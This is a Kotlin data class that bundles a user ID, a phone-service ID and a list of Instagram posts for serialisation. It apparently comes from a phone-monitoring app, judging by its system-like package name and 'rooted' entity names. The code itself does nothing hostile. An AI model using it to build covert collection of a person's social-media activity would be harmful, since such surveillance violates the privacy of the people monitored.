package com.android.services.models.im

import com.android.services.db.entities.InstagramPostRooted
import com.google.gson.annotations.SerializedName

class InstagramFeedLogs {

    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("instagramPosts")
    var instagramFeedList: List<InstagramPostRooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        instagramPostsUnrootedList: List<InstagramPostRooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        instagramFeedList = instagramPostsUnrootedList
    }
}